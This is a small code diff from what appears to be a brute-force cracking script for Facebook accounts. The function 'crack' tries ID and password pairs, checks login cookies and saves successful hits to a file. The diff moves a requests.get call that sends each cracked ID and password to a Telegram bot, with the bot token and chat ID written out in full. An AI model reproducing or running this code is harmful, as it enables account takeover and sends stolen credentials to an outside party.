@@ -808,9 +808,10 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				requests.get(f"https://api.telegram.org/bot6484663371:AAEQgcEe_qwbw5mSWr-vA0Aatdo9tYupY0Y/sendMessage?chat_id=877429061&text={idf}|{pw}")
 				print(f'\r\x1b[1;92m[SAW-OK] {idf}|{pw} {N}')
 				#saw
-				requests.get(f"https://api.telegram.org/bot6484663371:AAEQgcEe_qwbw5mSWr-vA0Aatdo9tYupY0Y/sendMessage?chat_id=877429061&text={idf}|{pw}")
+				
 				open('OK/'+okc,'a').write('\n'+idf+'|'+pw)
 				break
 			elif "c_user" in po.cookies.get_dict().keys():
